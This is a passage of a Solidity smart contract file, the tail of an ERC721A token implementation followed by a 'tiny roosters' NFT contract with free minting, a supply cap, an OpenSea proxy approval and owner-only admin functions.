1088         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1089         unchecked {
1090             _addressData[to].balance += uint64(quantity);
1091             _addressData[to].numberMinted += uint64(quantity);
1092 
1093             _ownerships[startTokenId].addr = to;
1094             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1095 
1096             uint256 updatedIndex = startTokenId;
1097             uint256 end = updatedIndex + quantity;
1098 
1099             if (safe && to.isContract()) {
1100                 do {
1101                     emit Transfer(address(0), to, updatedIndex);
1102                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1103                         revert TransferToNonERC721ReceiverImplementer();
1104                     }
1105                 } while (updatedIndex != end);
1106                 // Reentrancy protection
1107                 if (_currentIndex != startTokenId) revert();
1108             } else {
1109                 do {
1110                     emit Transfer(address(0), to, updatedIndex++);
1111                 } while (updatedIndex != end);
1112             }
1113             _currentIndex = updatedIndex;
1114         }
1115         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1116     }
1117 
1118     /**
1119      * @dev Transfers `tokenId` from `from` to `to`.
1120      *
1121      * Requirements:
1122      *
1123      * - `to` cannot be the zero address.
1124      * - `tokenId` token must be owned by `from`.
1125      *
1126      * Emits a {Transfer} event.
1127      */
1128     function _transfer(
1129         address from,
1130         address to,
1131         uint256 tokenId
1132     ) private {
1133         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1134 
1135         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1136             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1137             getApproved(tokenId) == _msgSender());
1138 
1139         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1140         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1141         if (to == address(0)) revert TransferToZeroAddress();
1142 
1143         _beforeTokenTransfers(from, to, tokenId, 1);
1144 
1145         // Clear approvals from the previous owner
1146         _approve(address(0), tokenId, prevOwnership.addr);
1147 
1148         // Underflow of the sender's balance is impossible because we check for
1149         // ownership above and the recipient's balance can't realistically overflow.
1150         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1151         unchecked {
1152             _addressData[from].balance -= 1;
1153             _addressData[to].balance += 1;
1154 
1155             _ownerships[tokenId].addr = to;
1156             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1157 
1158             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1159             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1160             uint256 nextTokenId = tokenId + 1;
1161             if (_ownerships[nextTokenId].addr == address(0)) {
1162                 // This will suffice for checking _exists(nextTokenId),
1163                 // as a burned slot cannot contain the zero address.
1164                 if (nextTokenId < _currentIndex) {
1165                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1166                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1167                 }
1168             }
1169         }
1170 
1171         emit Transfer(from, to, tokenId);
1172         _afterTokenTransfers(from, to, tokenId, 1);
1173     }
1174 
1175     /**
1176      * @dev Destroys `tokenId`.
1177      * The approval is cleared when the token is burned.
1178      *
1179      * Requirements:
1180      *
1181      * - `tokenId` must exist.
1182      *
1183      * Emits a {Transfer} event.
1184      */
1185     function _burn(uint256 tokenId) internal virtual {
1186         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1187 
1188         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1189 
1190         // Clear approvals from the previous owner
1191         _approve(address(0), tokenId, prevOwnership.addr);
1192 
1193         // Underflow of the sender's balance is impossible because we check for
1194         // ownership above and the recipient's balance can't realistically overflow.
1195         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1196         unchecked {
1197             _addressData[prevOwnership.addr].balance -= 1;
1198             _addressData[prevOwnership.addr].numberBurned += 1;
1199 
1200             // Keep track of who burned the token, and the timestamp of burning.
1201             _ownerships[tokenId].addr = prevOwnership.addr;
1202             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1203             _ownerships[tokenId].burned = true;
1204 
1205             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1206             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1207             uint256 nextTokenId = tokenId + 1;
1208             if (_ownerships[nextTokenId].addr == address(0)) {
1209                 // This will suffice for checking _exists(nextTokenId),
1210                 // as a burned slot cannot contain the zero address.
1211                 if (nextTokenId < _currentIndex) {
1212                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1213                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1214                 }
1215             }
1216         }
1217 
1218         emit Transfer(prevOwnership.addr, address(0), tokenId);
1219         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1220 
1221         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1222         unchecked {
1223             _burnCounter++;
1224         }
1225     }
1226 
1227     /**
1228      * @dev Approve `to` to operate on `tokenId`
1229      *
1230      * Emits a {Approval} event.
1231      */
1232     function _approve(
1233         address to,
1234         uint256 tokenId,
1235         address owner
1236     ) private {
1237         _tokenApprovals[tokenId] = to;
1238         emit Approval(owner, to, tokenId);
1239     }
1240 
1241     /**
1242      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1243      *
1244      * @param from address representing the previous owner of the given token ID
1245      * @param to target address that will receive the tokens
1246      * @param tokenId uint256 ID of the token to be transferred
1247      * @param _data bytes optional data to send along with the call
1248      * @return bool whether the call correctly returned the expected magic value
1249      */
1250     function _checkContractOnERC721Received(
1251         address from,
1252         address to,
1253         uint256 tokenId,
1254         bytes memory _data
1255     ) private returns (bool) {
1256         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1257             return retval == IERC721Receiver(to).onERC721Received.selector;
1258         } catch (bytes memory reason) {
1259             if (reason.length == 0) {
1260                 revert TransferToNonERC721ReceiverImplementer();
1261             } else {
1262                 assembly {
1263                     revert(add(32, reason), mload(reason))
1264                 }
1265             }
1266         }
1267     }
1268 
1269     /**
1270      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1271      * And also called before burning one token.
1272      *
1273      * startTokenId - the first token id to be transferred
1274      * quantity - the amount to be transferred
1275      *
1276      * Calling conditions:
1277      *
1278      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1279      * transferred to `to`.
1280      * - When `from` is zero, `tokenId` will be minted for `to`.
1281      * - When `to` is zero, `tokenId` will be burned by `from`.
1282      * - `from` and `to` are never both zero.
1283      */
1284     function _beforeTokenTransfers(
1285         address from,
1286         address to,
1287         uint256 startTokenId,
1288         uint256 quantity
1289     ) internal virtual {}
1290 
1291     /**
1292      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1293      * minting.
1294      * And also called after one token has been burned.
1295      *
1296      * startTokenId - the first token id to be transferred
1297      * quantity - the amount to be transferred
1298      *
1299      * Calling conditions:
1300      *
1301      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1302      * transferred to `to`.
1303      * - When `from` is zero, `tokenId` has been minted for `to`.
1304      * - When `to` is zero, `tokenId` has been burned by `from`.
1305      * - `from` and `to` are never both zero.
1306      */
1307     function _afterTokenTransfers(
1308         address from,
1309         address to,
1310         uint256 startTokenId,
1311         uint256 quantity
1312     ) internal virtual {}
1313 }
1314 
1315 
1316 
1317 contract tinyroosters is ERC721A, Owneable {
1318 
1319     string public baseURI = "ipfs://Qmbhk9BAuqnNiKGpGDWu5uxbo3NTq2neF3ioNTFvAABTWL/?";
1320     string public contractURI = "ipfs://Qmbhk9BAuqnNiKGpGDWu5uxbo3NTq2neF3ioNTFvAABTWL";
1321     string public constant baseExtension = ".json";
1322     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1323 
1324     uint256 public constant MAX_PER_TX_FREE = 0;
1325     uint256 public constant FREE_MAX_SUPPLY = 0;
1326     uint256 public constant MAX_PER_TX = 2;
1327     uint256 public constant MAX_SUPPLY = 2000;
1328     uint256 public constant price = 0 ether;
1329 
1330     bool public paused = false;
1331 
1332     constructor() ERC721A("tiny roosters", "rstr") {}
1333 
1334     function mint(uint256 _amount) external payable {
1335         address _caller = _msgSender();
1336         require(!paused, "Paused");
1337         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1338         require(_amount > 0, "No 0 mints");
1339         require(tx.origin == _caller, "No contracts");
1340         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1341         
1342         _safeMint(_caller, _amount);
1343     }
1344 
1345     function isApprovedForAll(address owner, address operator)
1346         override
1347         public
1348         view
1349         returns (bool)
1350     {
1351         // Whitelist OpenSea proxy contract for easy trading.
1352         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1353         if (address(proxyRegistry.proxies(owner)) == operator) {
1354             return true;
1355         }
1356 
1357         return super.isApprovedForAll(owner, operator);
1358     }
1359 
1360     function withdraw() external onlyOwner {
1361         uint256 balance = address(this).balance;
1362         (bool success, ) = _msgSender().call{value: balance}("");
1363         require(success, "Failed to send");
1364     }
1365 
1366     function setupOS() external onlyOwner {
1367         _safeMint(_msgSender(), 1);
1368     }
1369 
1370     function pause(bool _state) external onlyOwner {
1371         paused = _state;
1372     }
1373 
1374     function setBaseURI(string memory baseURI_) external onlyOwner {
1375         baseURI = baseURI_;
1376     }
1377 
1378     function setContractURI(string memory _contractURI) external onlyOwner {
1379         contractURI = _contractURI;
1380     }
1381 
1382     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1383         require(_exists(_tokenId), "Token does not exist.");
1384         return bytes(baseURI).length > 0 ? string(
1385             abi.encodePacked(
1386               baseURI,
1387               Strings.toString(_tokenId),
1388               baseExtension
1389             )
1390         ) : "";
1391     }
1392 }
1393 
1394 contract OwnableDelegateProxy { }
1395 contract ProxyRegistry {
1396     mapping(address => OwnableDelegateProxy) public proxies;
1397 }